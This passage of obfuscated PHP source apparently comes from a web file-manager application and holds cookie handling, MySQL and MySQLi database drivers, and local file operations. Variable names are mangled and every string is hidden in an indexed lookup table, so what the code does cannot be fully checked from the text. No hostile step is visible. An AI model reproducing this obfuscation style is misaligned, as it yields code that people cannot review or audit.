$öš‘ÙŠİ[$İÔÔ ‡[43]] == $İÔÔ ‡[85] || $öš‘ÙŠİ[$İÔÔ ‡[86]] <= 100) { return !1; } if (isset($öš‘ÙŠİ[$İÔÔ ‡[1346]]) || !$öš‘ÙŠİ[$İÔÔ ‡[94]]) { return !1; } if (isset($öš‘ÙŠİ[$İÔÔ ‡[212]]) && !$öš‘ÙŠİ[$İÔÔ ‡[212]]) { return $öš‘ÙŠİ; } static $“éù®İ = false; if (!$“éù®İ || !$‹¯È÷í) { $Á»¡¦¢° = self::driverType(IO::init($öš‘ÙŠİ[$İÔÔ ‡[94]])); $«“¾ô´¾ = $Á»¡¦¢°[$İÔÔ ‡[105]]; $“éù®İ = $İÔÔ ‡[1347]; if ($Á»¡¦¢°[$İÔÔ ‡[43]] == $İÔÔ ‡[116]) { $“éù®İ = $İÔÔ ‡[1348]; } if ($Á»¡¦¢°[$İÔÔ ‡[105]] && is_array($Á»¡¦¢°[$İÔÔ ‡[105]]->config)) { $Š†…Äú‡ = $Á»¡¦¢°[$İÔÔ ‡[105]]->config; if (isset($Š†…Äú‡[$İÔÔ ‡[1349]]) && $Š†…Äú‡[$İÔÔ ‡[1349]]) { $“éù®İ = $İÔÔ ‡[1348]; } } } return $“éù®İ == $İÔÔ ‡[1348] ? !0 : !1; } } goto f±â¯Ñ”„‰; C‰Š„§˜ùÚ: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($‚£©­Ô = '', $Ğ¨¦²ßÈ = 0) { if (is_string($‚£©­Ô) && $‚£©­Ô != $_SERVER[ªÏ§Ë·][12]) { $this->prefix = $‚£©­Ô; } if (is_numeric($Ğ¨¦²ßÈ) && $Ğ¨¦²ßÈ > 0) { $this->expire = $Ğ¨¦²ßÈ; } } public static function getInstance() { static $†ñ±ÂÌ; if ($†ñ±ÂÌ === null) { $†ñ±ÂÌ = new self(); } return $†ñ±ÂÌ; } private static $cookieDisable = false; public static function disable($ïÄ‹¤Èí) { self::$cookieDisable = $ïÄ‹¤Èí; } private static $sameCookieSet = array(); public static function set($‹Ï¢ê€Í, $†§ßÁŠî, $õµóªŠ– = 0, $¬ÒÍ“³Å = false, $‚ ‹£­Í = false) { $•Å¾¦ùÀ =& $_SERVER[ªÏ§Ë·]; if (self::$cookieDisable) { return; } if (!$õµóªŠ–) { $õµóªŠ– = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$‹Ï¢ê€Í]) && self::$sameCookieSet[$‹Ï¢ê€Í] == $†§ßÁŠî . $õµóªŠ–) { return; } self::$sameCookieSet[$‹Ï¢ê€Í] = $†§ßÁŠî . $õµóªŠ–; if (!$‚ ‹£­Í) { $‚ ‹£­Í = str_replace(HOST, $•Å¾¦ùÀ[12], APP_HOST); $‚ ‹£­Í = _get($GLOBALS, $•Å¾¦ùÀ[907], $‚ ‹£­Í); } $­¤íé‘§ = $•Å¾¦ùÀ[12]; setcookie($‹Ï¢ê€Í, $†§ßÁŠî, time() + $õµóªŠ–, $•Å¾¦ùÀ[8] . trim($‚ ‹£­Í, $•Å¾¦ùÀ[8]) . $­¤íé‘§, !1, !1, $¬ÒÍ“³Å); } public static function setSafe($šÎÑÈ€ç, $Œ¤¦¦Õ, $³»¥ù„› = 0) { self::set($šÎÑÈ€ç, $Œ¤¦¦Õ, $³»¥ù„›, !0); } public static function get($ãÃä×íˆ) { static $Ç—§Î¤ = false; if (!$Ç—§Î¤) { self::initHeaderCookie(); $Ç—§Î¤ = !0; } return isset($_COOKIE[$ãÃä×íˆ]) ? $_COOKIE[$ãÃä×íˆ] : !1; } private static function initHeaderCookie() { $Á—ÈÏ®Ñ =& $_SERVER[ªÏ§Ë·]; if (!isset($_SERVER[$Á—ÈÏ®Ñ[908]]) || !$_SERVER[$Á—ÈÏ®Ñ[908]]) { return; } $Ñ„ùá“‘ = explode($Á—ÈÏ®Ñ[81], $_SERVER[$Á—ÈÏ®Ñ[908]]); foreach ($Ñ„ùá“‘ as $Úİñ÷î³) { $Úİñ÷î³ = explode($Á—ÈÏ®Ñ[909], $Úİñ÷î³); if (count($Úİñ÷î³) != 2 || !isset($Úİñ÷î³[1])) { continue; } $_COOKIE[trim($Úİñ÷î³[0])] = trim($Úİñ÷î³[1]); } } public static function remove($­äÄ×È£, $ÕÛáÚ³ = false) { unset($_COOKIE[$­äÄ×È£]); self::set($­äÄ×È£, $_SERVER[ªÏ§Ë·][12], 1, $ÕÛáÚ³); } } class DbMysql extends Db { public function __construct($µç©®¡ = '') { $›Èê¹ê• =& $_SERVER[ªÏ§Ë·]; if (!extension_loaded($›Èê¹ê•[832])) { think_exception(think_lang($›Èê¹ê•[24]) . $›Èê¹ê•[910]); } if (!empty($µç©®¡)) { $this->config = $µç©®¡; if (empty($this->config[$›Èê¹ê•[27]])) { $this->config[$›Èê¹ê•[27]] = $›Èê¹ê•[12]; } } } public function connect($Â«ïºşÄ = '', $ˆ€Š­æ¥ = 0, $Ã¸òÈóÔ = false) { $ÃùŒ‹¡â =& $_SERVER[ªÏ§Ë·]; if (!isset($this->linkID[$ˆ€Š­æ¥])) { if (empty($Â«ïºşÄ)) { $Â«ïºşÄ = $this->config; } $ï¬‹¶˜“ = $Â«ïºşÄ[$ÃùŒ‹¡â[911]] . ($Â«ïºşÄ[$ÃùŒ‹¡â[912]] ? "\72{$Â«ïºşÄ[$ÃùŒ‹¡â[912]]}" : $ÃùŒ‹¡â[12]); $£Ê„ÁÖŞ = !empty($Â«ïºşÄ[$ÃùŒ‹¡â[27]][$ÃùŒ‹¡â[28]]) ? $Â«ïºşÄ[$ÃùŒ‹¡â[27]][$ÃùŒ‹¡â[28]] : $this->pconnect; if ($£Ê„ÁÖŞ) { $this->linkID[$ˆ€Š­æ¥] = mysql_pconnect($ï¬‹¶˜“, $Â«ïºşÄ[$ÃùŒ‹¡â[913]], $Â«ïºşÄ[$ÃùŒ‹¡â[914]], 131072); } else { $this->linkID[$ˆ€Š­æ¥] = mysql_connect($ï¬‹¶˜“, $Â«ïºşÄ[$ÃùŒ‹¡â[913]], $Â«ïºşÄ[$ÃùŒ‹¡â[914]], !0, 131072); } if (!$this->linkID[$ˆ€Š­æ¥] || !empty($Â«ïºşÄ[$ÃùŒ‹¡â[31]]) && !mysql_select_db($Â«ïºşÄ[$ÃùŒ‹¡â[31]], $this->linkID[$ˆ€Š­æ¥])) { think_exception(mysql_error()); } $ ‡½ˆ™© = mysql_get_server_info($this->linkID[$ˆ€Š­æ¥]); mysql_query($ÃùŒ‹¡â[915] . think_config($ÃùŒ‹¡â[916]) . $ÃùŒ‹¡â[68], $this->linkID[$ˆ€Š­æ¥]); if ($ ‡½ˆ™© > $ÃùŒ‹¡â[917]) { mysql_query($ÃùŒ‹¡â[918], $this->linkID[$ˆ€Š­æ¥]); } $this->connected = !0; if (1 != think_config($ÃùŒ‹¡â[32])) { unset($this->config); } } return $this->linkID[$ˆ€Š­æ¥]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ßÁŞêòâ) { $ú¥ ƒ÷ƒ =& $_SERVER[ªÏ§Ë·]; if (0 === stripos($ßÁŞêòâ, $ú¥ ƒ÷ƒ[302])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ßÁŞêòâ; if ($this->queryID) { $this->free(); } think_action_status($ú¥ ƒ÷ƒ[33], 1); think_status($ú¥ ƒ÷ƒ[34]); $this->queryID = mysql_query($ßÁŞêòâ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($˜€‡Í³Ô) { $¼¦êÌšã =& $_SERVER[ªÏ§Ë·]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $˜€‡Í³Ô; if ($this->queryID) { $this->free(); } think_action_status($¼¦êÌšã[35], 1); think_status($¼¦êÌšã[34]); $€—æ™š = mysql_query($˜€‡Í³Ô, $this->_linkID); $this->debug(); if (!1 === $€—æ™š) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ªÏ§Ë·][919], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÍæŠº¶ë = mysql_query($_SERVER[ªÏ§Ë·][920], $this->_linkID); $this->transTimes = 0; if (!$ÍæŠº¶ë) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¥Ù¥Ü™“ = mysql_query($_SERVER[ªÏ§Ë·][921], $this->_linkID); $this->transTimes = 0; if (!$¥Ù¥Ü™“) { $this->error(); return !1; } } return !0; } private function getAll() { $ëú¦¬û¨ = array(); if ($this->numRows > 0) { while ($„ÆñË„ = mysql_fetch_assoc($this->queryID)) { $ëú¦¬û¨[] = $„ÆñË„; } mysql_data_seek($this->queryID, 0); } return $ëú¦¬û¨; } public function getFields($¡µ„€ˆ») { $ÂòÜ¼¼ =& $_SERVER[ªÏ§Ë·]; $Ûš„íØ¦ = $this->query($ÂòÜ¼¼[922] . $this->parseKey($¡µ„€ˆ»)); $ìÖÙò–ü = array(); if ($Ûš„íØ¦) { foreach ($Ûš„íØ¦ as $¢Ä¨‹”â => $»ÅÃ—Åº) { $ìÖÙò–ü[$»ÅÃ—Åº[$ÂòÜ¼¼[41]]] = array($ÂòÜ¼¼[42] => $»ÅÃ—Åº[$ÂòÜ¼¼[41]], $ÂòÜ¼¼[43] => $»ÅÃ—Åº[$ÂòÜ¼¼[44]], $ÂòÜ¼¼[45] => (bool) (strtoupper($»ÅÃ—Åº[$ÂòÜ¼¼[46]]) === $ÂòÜ¼¼[923]), $ÂòÜ¼¼[47] => $»ÅÃ—Åº[$ÂòÜ¼¼[48]], $ÂòÜ¼¼[49] => strtolower($»ÅÃ—Åº[$ÂòÜ¼¼[50]]) == $ÂòÜ¼¼[51], $ÂòÜ¼¼[52] => strtolower($»ÅÃ—Åº[$ÂòÜ¼¼[53]]) == $ÂòÜ¼¼[54]); } } return $ìÖÙò–ü; } public function getTables($Ñ‹˜À¨ƒ = '') { $£àó•ú =& $_SERVER[ªÏ§Ë·]; if (!empty($Ñ‹˜À¨ƒ)) { $’ïü«Úğ = $£àó•ú[924] . $Ñ‹˜À¨ƒ . $£àó•ú[925]; } else { $’ïü«Úğ = $£àó•ú[926]; } $¹œõçìù = $this->query($’ïü«Úğ); $åØİ‘°÷ = array(); foreach ($¹œõçìù as $½ÈïáÑ => $†šÁ¯ë‰) { $åØİ‘°÷[$½ÈïáÑ] = current($†šÁ¯ë‰); } return $åØİ‘°÷; } public function replace($ÆÔ´ñ´ï, $”«“­½ = array()) { $«´àŒæ¹ =& $_SERVER[ªÏ§Ë·]; foreach ($ÆÔ´ñ´ï as $àÚæä‚Ü => $‹‚ğÒŸ) { $ùªÎåÌ = $this->parseValue($‹‚ğÒŸ); if (is_scalar($ùªÎåÌ)) { $ë¢ö¾¥ï[] = $ùªÎåÌ; $…Ä ¹¥Ş[] = $this->parseKey($àÚæä‚Ü); } } $•ãÕÏƒÙ = $«´àŒæ¹[927] . $this->parseTable($”«“­½[$«´àŒæ¹[317]]) . $«´àŒæ¹[928] . implode($«´àŒæ¹[60], $…Ä ¹¥Ş) . $«´àŒæ¹[929] . implode($«´àŒæ¹[60], $ë¢ö¾¥ï) . $«´àŒæ¹[930]; return $this->execute($•ãÕÏƒÙ); } public function insertAll($Ä¦éÒö´, $ï„ş’éÅ = array(), $ï»Øƒ›— = false) { $šÔôÏö =& $_SERVER[ªÏ§Ë·]; if (!is_array($Ä¦éÒö´[0])) { return !1; } $×µ½Ï = array_keys($Ä¦éÒö´[0]); $ÊÍ¿‘Ñö = array(); foreach ($Ä¦éÒö´ as $†×•ÛŒ©) { $úªâ†ÂÎ = array(); foreach ($†×•ÛŒ© as $¸££õ½» => $æÀ»¶‡ê) { $æÀ»¶‡ê = $this->parseValue($æÀ»¶‡ê); if (is_scalar($æÀ»¶‡ê)) { $úªâ†ÂÎ[] = $æÀ»¶‡ê; } } $ÊÍ¿‘Ñö[] = $šÔôÏö[298] . implode($šÔôÏö[60], $úªâ†ÂÎ) . $šÔôÏö[930]; } array_walk($×µ½Ï, array($this, $šÔôÏö[931])); $Õ»áÈÚ = ($ï»Øƒ›— ? $šÔôÏö[932] : $šÔôÏö[933]) . $šÔôÏö[934] . $this->parseTable($ï„ş’éÅ[$šÔôÏö[317]]) . $šÔôÏö[928] . implode($šÔôÏö[60], $×µ½Ï) . $šÔôÏö[935] . implode($šÔôÏö[60], $ÊÍ¿‘Ñö); return $this->execute($Õ»áÈÚ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $é¯ ‚Œ€ =& $_SERVER[ªÏ§Ë·]; $this->error = mysql_errno() . $é¯ ‚Œ€[4] . mysql_error($this->_linkID); if ($é¯ ‚Œ€[12] != $this->queryStr) { $this->error .= LNG($é¯ ‚Œ€[58]) . $this->queryStr; } think_trace($this->error, $é¯ ‚Œ€[12], $é¯ ‚Œ€[59]); return $this->error; } public function escapeString($ˆ¤»çë) { if ($this->_linkID) { return mysql_real_escape_string($ˆ¤»çë, $this->_linkID); } else { return mysql_escape_string($ˆ¤»çë); } } public function parseKey(&$•À™éş¿, $Ç©ÖâÈü = true) { $¸¦²ûâ =& $_SERVER[ªÏ§Ë·]; if ($Ç©ÖâÈü) { $•À™éş¿ = $this->parseKeyCheck($•À™éş¿); } if ($•À™éş¿ != $¸¦²ûâ[199] && !preg_match($¸¦²ûâ[936], $•À™éş¿)) { $•À™éş¿ = $¸¦²ûâ[423] . trim($•À™éş¿, $¸¦²ûâ[423]) . $¸¦²ûâ[423]; } return $•À™éş¿; } } class DbMysqli extends Db { public function __construct($«µ™¤·× = '') { $¸û”¢Ä† =& $_SERVER[ªÏ§Ë·]; if (!extension_loaded($¸û”¢Ä†[937])) { think_exception(think_lang($¸û”¢Ä†[24]) . $¸û”¢Ä†[938]); } if (!empty($«µ™¤·×)) { $this->config = $«µ™¤·×; if (empty($this->config[$¸û”¢Ä†[27]])) { $this->config[$¸û”¢Ä†[27]] = $¸û”¢Ä†[12]; } } } public function connect($„ØÑ—Àá = '', $¨‡èñ³ = 0) { $Œë™ØÒú =& $_SERVER[ªÏ§Ë·]; if (!isset($this->linkID[$¨‡èñ³])) { if (empty($„ØÑ—Àá)) { $„ØÑ—Àá = $this->config; } $this->linkID[$¨‡èñ³] = new mysqli($„ØÑ—Àá[$Œë™ØÒú[911]], $„ØÑ—Àá[$Œë™ØÒú[913]], $„ØÑ—Àá[$Œë™ØÒú[914]], $„ØÑ—Àá[$Œë™ØÒú[31]], $„ØÑ—Àá[$Œë™ØÒú[912]] ? intval($„ØÑ—Àá[$Œë™ØÒú[912]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $¨º‰­Õá = $this->linkID[$¨‡èñ³]->server_version; $this->linkID[$¨‡èñ³]->query($Œë™ØÒú[915] . think_config($Œë™ØÒú[916]) . $Œë™ØÒú[68]); if ($¨º‰­Õá > $Œë™ØÒú[917]) { $this->linkID[$¨‡èñ³]->query($Œë™ØÒú[918]); } $this->connected = !0; if (1 != think_config($Œë™ØÒú[32])) { unset($this->config); } } return $this->linkID[$¨‡èñ³]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($³ŠÌ÷€›) { $×Ñìêú’ =& $_SERVER[ªÏ§Ë·]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $³ŠÌ÷€›; if ($this->queryID) { $this->free(); } think_action_status($×Ñìêú’[33], 1); think_status($×Ñìêú’[34]); $this->queryID = $this->_linkID->query($³ŠÌ÷€›); if ($this->_linkID->more_results()) { while (($€Ã·ÏÓ´ = $this->_linkID->next_result()) != NULL) { $€Ã·ÏÓ´->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($è·›Î×Ê) { $ÜÍÍóëª =& $_SERVER[ªÏ§Ë·]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $è·›Î×Ê; if ($this->queryID) { $this->free(); } think_action_status($ÜÍÍóëª[35], 1); think_status($ÜÍÍóëª[34]); $¥´äåºŠ = $this->_linkID->query($è·›Î×Ê); $this->debug(); if (!1 === $¥´äåºŠ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ßÍø‚Ø” = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ßÍø‚Ø”) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ûµè™Â = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ûµè™Â) { $this->error(); return !1; } } return !0; } private function getAll() { $Ì˜Ğèî = array(); if ($this->numRows > 0) { for ($ÈÙ•ŸĞ = 0; $ÈÙ•ŸĞ < $this->numRows; $ÈÙ•ŸĞ++) { $Ì˜Ğèî[$ÈÙ•ŸĞ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Ì˜Ğèî; } public function getFields($âõÀí¥‡) { $ô—µ®¯Ñ =& $_SERVER[ªÏ§Ë·]; $ÎëªõìŞ = $this->query($ô—µ®¯Ñ[922] . $this->parseKey($âõÀí¥‡)); $ìŒßÕüè = array(); if ($ÎëªõìŞ) { foreach ($ÎëªõìŞ as $í«ÀÀ” => $Í¬Û÷”ë) { $ìŒßÕüè[$Í¬Û÷”ë[$ô—µ®¯Ñ[41]]] = array($ô—µ®¯Ñ[42] => $Í¬Û÷”ë[$ô—µ®¯Ñ[41]], $ô—µ®¯Ñ[43] => $Í¬Û÷”ë[$ô—µ®¯Ñ[44]], $ô—µ®¯Ñ[45] => (bool) ($Í¬Û÷”ë[$ô—µ®¯Ñ[46]] === $ô—µ®¯Ñ[12]), $ô—µ®¯Ñ[47] => $Í¬Û÷”ë[$ô—µ®¯Ñ[48]], $ô—µ®¯Ñ[49] => strtolower($Í¬Û÷”ë[$ô—µ®¯Ñ[50]]) == $ô—µ®¯Ñ[51], $ô—µ®¯Ñ[52] => strtolower($Í¬Û÷”ë[$ô—µ®¯Ñ[53]]) == $ô—µ®¯Ñ[54]); } } return $ìŒßÕüè; } public function getTables($ŠÇ¤Ñîª = '') { $—¨İÎÈ§ =& $_SERVER[ªÏ§Ë·]; $’”‹¥¹ = !empty($ŠÇ¤Ñîª) ? $—¨İÎÈ§[924] . $ŠÇ¤Ñîª . $—¨İÎÈ§[925] : $—¨İÎÈ§[926]; $ˆ×Ï‹ = $this->query($’”‹¥¹); $²¶Ä·ó = array(); if ($ˆ×Ï‹) { foreach ($ˆ×Ï‹ as $‰µç½Ê¯ => $—œÓïÉ) { $²¶Ä·ó[$‰µç½Ê¯] = current($—œÓïÉ); } } return $²¶Ä·ó; } public function replace($êßÃÎ¸«, $Á˜šõ´• = array()) { $†—“‹ÚĞ =& $_SERVER[ªÏ§Ë·]; foreach ($êßÃÎ¸« as $üçõ³´ı => $©é­•¹) { $ˆÔÜ¸Ùğ = $this->parseValue($©é­•¹); if (is_scalar($ˆÔÜ¸Ùğ)) { $âş—Å’†[] = $ˆÔÜ¸Ùğ; $¦¦¨×È’[] = $this->parseKey($üçõ³´ı); } } $ãşŸ–å = $†—“‹ÚĞ[927] . $this->parseTable($Á˜šõ´•[$†—“‹ÚĞ[317]]) . $†—“‹ÚĞ[928] . implode($†—“‹ÚĞ[60], $¦¦¨×È’) . $†—“‹ÚĞ[929] . implode($†—“‹ÚĞ[60], $âş—Å’†) . $†—“‹ÚĞ[930]; return $this->execute($ãşŸ–å); } public function insertAll($‡¯ªèÂı, $èşÊÎ¿ = array(), $ÒıÜ¹Êà = false) { $ê§æ«ã =& $_SERVER[ªÏ§Ë·]; if (!is_array($‡¯ªèÂı[0])) { return !1; } $Î¿ç†¨ = array_keys($‡¯ªèÂı[0]); $ªª®Áûô = array(); foreach ($‡¯ªèÂı as $¯ó„ ™) { $àô“İıœ = array(); foreach ($¯ó„ ™ as $ĞŞè£í => $–ªœœ‰) { $–ªœœ‰ = $this->parseValue($–ªœœ‰); if (is_scalar($–ªœœ‰)) { $àô“İıœ[] = $–ªœœ‰; } } $ªª®Áûô[] = $ê§æ«ã[298] . implode($ê§æ«ã[60], $àô“İıœ) . $ê§æ«ã[930]; } array_walk($Î¿ç†¨, array($this, $ê§æ«ã[931])); $°ò¢“Ù´ = $ÒıÜ¹Êà ? $ê§æ«ã[932] : $ê§æ«ã[933]; $Ë½ï¾Ì = $°ò¢“Ù´ . $ê§æ«ã[934] . $this->parseTable($èşÊÎ¿[$ê§æ«ã[317]]) . $ê§æ«ã[928] . implode($ê§æ«ã[60], $Î¿ç†¨) . $ê§æ«ã[935] . implode($ê§æ«ã[60], $ªª®Áûô); return $this->execute($Ë½ï¾Ì); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $°é˜é–ˆ =& $_SERVER[ªÏ§Ë·]; $this->error = $this->_linkID->errno . $°é˜é–ˆ[4] . $this->_linkID->error; if ($°é˜é–ˆ[12] != $this->queryStr) { $this->error .= LNG($°é˜é–ˆ[58]) . $this->queryStr; } think_trace($this->error, $°é˜é–ˆ[12], $°é˜é–ˆ[59]); return $this->error; } public function escapeString($ˆØüóŞ“) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ˆØüóŞ“); } else { return addslashes($ˆØüóŞ“); } } public function parseKey(&$œ§ı‹¾, $Ôç†‘¿¿ = true) { $æÛ Íøê =& $_SERVER[ªÏ§Ë·]; if ($Ôç†‘¿¿) { $œ§ı‹¾ = $this->parseKeyCheck($œ§ı‹¾); } if ($œ§ı‹¾ != $æÛ Íøê[199] && !preg_match($æÛ Íøê[936], $œ§ı‹¾)) { $œ§ı‹¾ = $æÛ Íøê[423] . trim($œ§ı‹¾, $æÛ Íøê[423]) . $æÛ Íøê[423]; } return $œ§ı‹¾; } } goto a›æŠ›‡¦“; f¦ƒî…ĞÅØ: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($Í¸àâøš) { if (substr($Í¸àâøš, 0, 2) == $_SERVER[ªÏ§Ë·][1303]) { $Í¸àâøš = BASIC_PATH . substr($Í¸àâøš, 2); } return $Í¸àâøš; } public function iconvApp($èÔß‰Æ¼) { $…¦«ê‰ù =& $_SERVER[ªÏ§Ë·]; global $config; return $this->iconvTo($èÔß‰Æ¼, $config[$…¦«ê‰ù[1378]], $config[$…¦«ê‰ù[1377]]); } public function iconvSystem($‚Ñ÷ß’¥) { $üõÛ³÷ü =& $_SERVER[ªÏ§Ë·]; global $config; return $this->iconvTo($‚Ñ÷ß’¥, $config[$üõÛ³÷ü[1377]], $config[$üõÛ³÷ü[1378]]); } public function getPathOuter($çû”äë­) { $Á½¢²­÷ =& $_SERVER[ªÏ§Ë·]; $Ü…Áœã† = $this->iconvApp($this->pathBase); $çû”äë­ = $this->iconvApp($çû”äë­); if (substr($Ü…Áœã†, 0, 2) == $Á½¢²­÷[1303]) { $Ü…Áœã† = BASIC_PATH . substr($Ü…Áœã†, 2); } if (substr($çû”äë­, 0, 2) == $Á½¢²­÷[1303]) { $çû”äë­ = BASIC_PATH . substr($çû”äë­, 2); } $Ü…Áœã† = KodIO::clear($Ü…Áœã†); $çû”äë­ = KodIO::clear($çû”äë­); $çû”äë­ = substr($çû”äë­, strlen($Ü…Áœã†)); if (empty($this->pathDriver)) { return $çû”äë­; } return $this->pathDriver . $Á½¢²­÷[8] . ltrim($çû”äë­, $Á½¢²­÷[8]); } public function mkfile($ª‘º½‚Õ, $ÖòÎ¦¢õ = '', $¢óüÆó³ = REPEAT_RENAME) { $ª‘º½‚Õ = $this->iconvSystem($ª‘º½‚Õ); @touch($ª‘º½‚Õ); if ($ÖòÎ¦¢õ) { file_put_contents($ª‘º½‚Õ, $ÖòÎ¦¢õ); } @chmod($ª‘º½‚Õ, $this->pathAuth); return is_file($ª‘º½‚Õ) ? $this->getPathOuter($ª‘º½‚Õ) : !1; } public function mkdir($şœ„ÌË, $ŠÇÕù§Ï = REPEAT_SKIP) { $şœ„ÌË = $this->iconvSystem($şœ„ÌË); if (is_dir($şœ„ÌË)) { return $this->getPathOuter($şœ„ÌË); } @mkdir($şœ„ÌË, $this->pathAuth, !0); @chmod($şœ„ÌË, $this->pathAuth); return is_dir($şœ„ÌË) ? $this->getPathOuter($şœ„ÌË) : !1; } public function copyFile($ıìµ»í¶, $œşà‘Ùû) { $this->mkdir($this->pathFather($œşà‘Ùû)); $ıìµ»í¶ = $this->iconvSystem($ıìµ»í¶); $œşà‘Ùû = $this->iconvSystem($œşà‘Ùû); $Ÿ¤óÖÂ = copy_64($ıìµ»í¶, $œşà‘Ùû); @chmod($œşà‘Ùû, $this->pathAuth); return $Ÿ¤óÖÂ ? $this->getPathOuter($œşà‘Ùû) : !1; } public function moveFile($›æÌìåŸ, $›¶¢ùÓ›) { $this->mkdir($this->pathFather($›¶¢ùÓ›)); $›æÌìåŸ = $this->iconvSystem($›æÌìåŸ); $›¶¢ùÓ› = $this->iconvSystem($›¶¢ùÓ›); $ ›ÛùÉà = intval(@rename($›æÌìåŸ, $›¶¢ùÓ›)); if (!$ ›ÛùÉà) { if ($ ›ÛùÉà = intval(@copy_64($›æÌìåŸ, $›¶¢ùÓ›))) { @unlink($›æÌìåŸ); } } @chmod($›¶¢ùÓ›, $this->pathAuth); return $ ›ÛùÉà ? $this->getPathOuter($›¶¢ùÓ›) : !1; } public function movePath($Ô¼çÀª, $†Òçàè…, $¨Ì—äê‡ = false) { $×óÖ¯Ôğ =& $_SERVER[ªÏ§Ë·]; $Ô¼çÀª = $this->iconvSystem($Ô¼çÀª); $†Òçàè… = $this->iconvSystem($†Òçàè…); $óÜ¬Ú–ª = rtrim($†Òçàè…, $×óÖ¯Ôğ[8]) . $×óÖ¯Ôğ[8] . ($¨Ì—äê‡ ? $¨Ì—äê‡ : get_path_this($Ô¼çÀª)); if (file_exists($óÜ¬Ú–ª)) { return !1; } $»Åû¥áÊ = intval(@rename($Ô¼çÀª, $óÜ¬Ú–ª)); $»Åû¥áÊ = file_exists($óÜ¬Ú–ª); return $»Åû¥áÊ ? $this->getPathOuter($óÜ¬Ú–ª) : !1; } public function delFile($ÏÄÄ·Ã›) { $ÏÄÄ·Ã› = $this->iconvSystem($ÏÄÄ·Ã›); if (!@unlink($ÏÄÄ·Ã›)) { @chmod($ÏÄÄ·Ã›, $this->pathAuth); if (!@unlink($ÏÄÄ·Ã›)) { return !1; } } else { return !0; } } public function delFolder($£é…Ê§«) { $·‹ÛŞ×„ =& $_SERVER[ªÏ§Ë·]; $£é…Ê§« = $this->iconvSystem($£é…Ê§«); if (!is_dir($£é…Ê§«)) { return !0; } if (!($ô©ñ÷Ê = opendir($£é…Ê§«))) { return !1; } while (($ºõõñº¢ = readdir($ô©ñ÷Ê)) !== !1) { if ($ºõõñº¢ == $·‹ÛŞ×„[10] || $ºõõñº¢ == $·‹ÛŞ×„[1304]) { continue; } $î£°İ–Å = $£é…Ê§« . $·‹ÛŞ×„[8] . $ºõõñº¢; if (is_file($î£°İ–Å) || is_link($î£°İ–Å)) { if (!unlink($î£°İ–Å)) { chmod($î£°İ–Å, $this->pathAuth); if (!unlink($î£°İ–Å)) { return !1; } } } else { if (is_dir($î£°İ–Å)) { chmod($î£°İ–Å, $this->pathAuth); $î£°İ–Å = $this->iconvApp($î£°İ–Å); if (!$this->delFolder($î£°İ–Å)) { return !1; } } } } closedir($ô©ñ÷Ê); return rmdir($£é…Ê§«); } public function rename($€‹äıÉò, $ïùòË–Ï) { $¸Ó‘õšÂ =& $_SERVER[ªÏ§Ë·]; $°Ì¤²Áî = $this->fileNameAuto($this->pathFather($€‹äıÉò), $ïùòË–Ï); $°Ì¤²Áî = $this->iconvSystem($°Ì¤²Áî); $€‹äıÉò = $this->iconvSystem($€‹äıÉò); $¸òËè±ú = $this->pathFather($€‹äıÉò); $Ø¼¶ğÈé = rtrim($¸òËè±ú, $¸Ó‘õšÂ[8]) . $¸Ó‘õšÂ[8] . $°Ì¤²Áî; $Ê¼±«†ã = @rename($€‹äıÉò, $Ø¼¶ğÈé); $Ø¼¶ğÈé = $this->iconvApp($Ø¼¶ğÈé); return $Ê¼±«†ã ? $this->getPathOuter($Ø¼¶ğÈé) : !1; } public function size($Ğ£ÛéÆ¤) { $Ğ£ÛéÆ¤ = $this->iconvSystem($Ğ£ÛéÆ¤); return filesize_64($Ğ£ÛéÆ¤); } public function info($÷Âå™ƒ¶) { $÷Âå™ƒ¶ = $this->iconvSystem($÷Âå™ƒ¶); if ($this->isFolder($÷Âå™ƒ¶)) { return $this->folderInfo($÷Âå™ƒ¶); } else { if ($this->isFile($÷Âå™ƒ¶)) { return $this->fileInfo($÷Âå™ƒ¶); } } return !1; } protected function infoChildren($§¿òÀÔœ, &$à‰Éé´®, $œìßªé = true) { $šˆ½ó­‘ =& $_SERVER[ªÏ§Ë·]; check_abort_echo(); $§¿òÀÔœ = rtrim($§¿òÀÔœ, $šˆ½ó­‘[8]) . $šˆ½ó­‘[8]; if ($œìßªé) { $§¿òÀÔœ = $this->iconvSystem($§¿òÀÔœ); } if 